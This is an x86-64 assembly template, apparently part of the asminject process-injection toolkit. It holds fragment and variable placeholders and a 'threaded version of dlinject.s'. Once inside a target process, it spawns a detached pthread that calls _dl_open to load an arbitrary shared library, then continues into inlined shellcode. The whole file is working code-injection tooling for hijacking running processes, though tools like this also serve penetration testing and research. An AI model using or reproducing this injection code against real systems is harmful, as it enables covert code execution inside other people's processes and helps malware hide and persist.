# Threaded version of dlinject.s
# Same caveats as execute_precompiled_threaded.s

[FRAGMENT:asminject_ld_dl_open.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_detach.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_exit.s:FRAGMENT]

	jmp post_load_library

load_library:
	// BEGIN: call _dl_open() against the specified library
	push r14
	lea rdi, library_path[rip]
	call asminject_ld_dl_open
	pop r14
	mov rdi, 0
	call asminject_libpthread_pthread_exit
	// END: call _dl_open()

post_load_library:
	lea rax, load_library[rip]
	mov rdx, rax
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 0x1000		# don't overwrite anything important
	push rdx
	push rdi
	call asminject_libpthread_pthread_create
	pop rdi
	pop rdx
// detach the newly-created thread where the library has been loaded
	call asminject_libpthread_pthread_detach
	
[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]:
	
# inlined shellcode will go after this delimiter
SHELLCODE_SECTION_DELIMITER

library_path:
	.ascii "[VARIABLE:librarypath:VARIABLE]\0"
